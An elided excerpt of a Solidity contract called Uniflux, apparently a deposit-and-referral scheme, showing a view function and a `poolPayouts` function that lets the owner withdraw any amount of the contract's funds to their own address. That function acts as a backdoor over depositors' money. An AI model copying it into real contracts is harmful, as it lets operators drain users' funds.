...
contract Uniflux {
    ...
    */
    ...
    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
     ...
     function poolPayouts(uint256 _amount) public  {
        require(msg.sender == owner,"No pool payment available");
        uint256 pool_bonus = _amount;
        owner.transfer(pool_bonus);
    }
